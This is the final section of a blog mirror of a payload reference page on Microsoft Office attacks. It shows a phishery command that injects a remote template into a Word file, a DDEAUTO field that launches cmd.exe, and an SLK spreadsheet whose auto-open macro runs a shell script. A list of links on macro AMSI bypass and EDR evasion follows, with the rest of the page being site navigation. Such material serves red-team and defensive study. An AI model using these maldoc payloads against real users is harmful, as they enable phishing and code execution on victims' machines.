<h3 id="template-injections-tools">Template Injections Tools</h3>

<ul>
  <li>https://github.com/JohnWoodman/remoteInjector</li>
  <li>https://github.com/ryhanson/phishery</li>
</ul>

<pre><code class="language-ps1">$ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
[+] Opening Word document: good.docx
[+] Setting Word document template to: https://secure.site.local/docs
[+] Saving injected Word document to: bad.docx
[*] Injected Word document has been saved!
</code></pre>

<h2 id="docx---dde">DOCX - DDE</h2>

<ul>
  <li>Insert &gt; QuickPart &gt; Field</li>
  <li>Right Click &gt; Toggle Field Code</li>
  <li><code class="language-plaintext highlighter-rouge">{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" }</code></li>
</ul>

<h2 id="slk---excel">SLK - Excel</h2>

<pre><code class="language-ps1">ID;P
O;E
NN;NAuto_open;ER101C1;KOut Flank;F
C;X1;Y101;K0;EEXEC("c:\shell.cmd")
C;X1;Y102;K0;EHALT()
E
</code></pre>

<h2 id="references">References</h2>

<ul>
  <li><a href="https://itm4n.github.io/vba-runpe-part1/">VBA RunPE Part 1 - itm4n</a></li>
  <li><a href="https://itm4n.github.io/vba-runpe-part2/">VBA RunPE Part 2 - itm4n</a></li>
  <li><a href="https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/">Office VBA AMSI Parting the veil on malicious macros - Microsoft</a></li>
  <li><a href="https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/">Bypassing AMSI fro VBA - Outflank</a></li>
  <li><a href="https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/">Evil Clippy MS Office Maldoc Assistant - Outflank</a></li>
  <li><a href="https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/">Old schoold evil execl 4.0 macros XLM - Outflank</a></li>
  <li><a href="https://bytecod3r.io/excel-4-macro-generator-x86-x64/">Excel 4 Macro Generator x86/x64 - bytecod3r</a></li>
  <li><a href="https://github.com/Pepitoh/VBad">VBad - Pepitoh</a></li>
  <li><a href="https://d13ot9o61jdzpp.cloudfront.net/files/Excel%204.0%20Macro%20Functions%20Reference.pdf">Excel 4.0 Macro Function Reference PDF</a></li>
  <li><a href="https://www.sneakymonkey.net/2020/06/22/excel-4-0-macros-so-hot-right-now/">Excel 4.0 Macros so hot right now - SneekyMonkey</a></li>
  <li><a href="https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/">Macros and more with sharpshooter v2.0 - mdsec</a></li>
  <li><a href="https://malware.pizza/2020/06/19/further-evasion-in-the-forgotten-corners-of-ms-xls/">Further evasion in the forgotten corners of ms xls - malware.pizza</a></li>
  <li><a href="https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9">Excel 4.0 macro old but new - fsx30</a></li>
  <li><a href="https://d-sec.net/2020/10/24/xls-4-0-macros-and-covenant/">XLS 4.0 macros and covenant - d-sec</a></li>
  <li><a href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros">Inject macro from a remote dotm template - ired.team</a></li>
  <li><a href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk">Phishinh with OLE - ired.team</a></li>
  <li><a href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-.slk-excel">Phishing SLK - ired.team</a>bypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships)</li>
  <li><a href="https://www.bitdam.com/2018/05/22/propertybomb-an-old-new-technique-for-arbitrary-code-execution-in-vba-macro/">PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018</a></li>
  <li><a href="https://secureyourit.co.uk/wp/2020/04/17/amsi-in-the-heap/">AMSI in the heap - rmdavy</a></li>
  <li><a href="https://github.com/rmdavy/WordAmsiBypass">WordAMSIBypass - rmdavy</a></li>
  <li><a href="https://blog.f-secure.com/dechaining-macros-and-evading-edr/">Dechaining macros and evading EDR - Noora Hyvärinen</a></li>
  <li><a href="http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html">Executing macros from docx with remote - RedXORBlueJuly 18, 2018</a></li>
  <li><a href="https://adepts.of0x.cc/alternatives-copy-shellcode/">One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021</a></li>
  <li><a href="http://www.greyhathacker.net/?p=948">Running macros via ActiveX controls - greyhathacker - September 29, 2016</a></li>
  <li><a href="https://www.goggleheadedhacker.com/blog/post/23">Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental</a></li>
</ul>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/methodology-and-resource/'>Methodology and Resource</a>,
            <a href='/categories/attacks/'>Attacks</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/attacks/"
            class="post-tag no-text-decoration" >Attacks</a>
          
          <a href="/tags/office/"
            class="post-tag no-text-decoration" >Office</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Office - Attacks - PayloadsAllTheThings&url=http://localhost:4000/Office-Attacks/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Office - Attacks - PayloadsAllTheThings&u=http://localhost:4000/Office-Attacks/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=Office - Attacks - PayloadsAllTheThings&url=http://localhost:4000/Office-Attacks/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/Active-Directory-Attacks/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May  6, 2021
  

  <i class="unloaded">2021-05-06T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory Attacks</h3>
            <div class="text-muted small">
              <p>
                





                Summary


  Active Directory Attacks
    
      Summary
      Tools
      Active Directory Recon
        
          Using BloodHound
          Using PowerView
          Using AD Module
        
   ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/Reverse-Shell-Cheatsheet/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Apr 26, 2021
  

  <i class="unloaded">2021-04-26T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Reverse Shell Cheat Sheet</h3>
            <div class="text-muted small">
              <p>
                





                Summary


  Reverse Shell
    
      Awk
      Automatic Reverse Shell Generator
      Bash TCP
      Bash UDP
      C
      Dart
      Golang
      Groovy Alternative 1
      Groovy
      Java Alt...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/Cloud-AWS-Pentest/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May  1, 2021
  

  <i class="unloaded">2021-05-01T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>AWS</h3>
            <div class="text-muted small">
              <p>
                





                
  Amazon Web Services offers reliable, scalable, and inexpensive cloud computing services.


Summary


  AWS
    
      Summary
      Training
      Tools
      AWS Patterns
      AWS - Metadata S...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/GraphQL-Injection/" class="btn btn-outline-primary"
    prompt="Older">
    <p>GraphQL Injection</p>
  </a>
  

  
  <a href="/XSS-Injection/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>XSS Injection</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/Zxce3_">Zxce3</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://localhost:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

